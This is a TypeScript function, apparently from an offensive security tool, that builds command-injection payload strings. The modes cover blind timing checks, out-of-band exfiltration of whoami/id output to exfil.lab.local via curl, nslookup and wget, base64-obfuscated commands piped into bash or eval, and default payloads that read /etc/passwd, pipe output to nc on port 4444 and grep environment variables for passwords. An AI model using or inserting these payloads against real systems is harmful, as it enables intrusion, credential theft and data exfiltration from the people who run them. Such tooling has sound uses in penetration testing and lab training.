export function generateSuggestions(mode: string | undefined, baseCmd = "whoami"): string[] {
  const base = (baseCmd || "id").trim();
  if (mode === "blind") {
    return [
      `${base} && sleep 7`,
      `${base} && ping -c 6 127.0.0.1`,
      `${base}; sleep 3 && echo "blind_confirmed"`,
    ];
  }
  if (mode === "oob") {
    return [
      `${base} && curl http://exfil.lab.local/$(whoami)`,
      `${base} && nslookup $(id).exfil.lab.local`,
      `${base} && wget -q http://exfil.lab.local/?x=$(id) -O/dev/null`,
    ];
  }
  if (mode === "quantum") {
    const b64 = Buffer.from(base).toString("base64");
    return [
      `echo ${b64} | base64 -d | bash`,
      `eval "$(echo ${b64} | base64 -d)"`,
      `bash -c "$(echo ${b64} | base64 -d)"`,
    ];
  }
  return [
    `${base} && ls -la`,
    `${base}; cat /etc/passwd`,
    `${base} | nc exfil.lab.local 4444`,
    `${base} && env | grep -i pass`,
    `${base} && find / -name "*.conf" 2>/dev/null | head -5`,
  ];
}
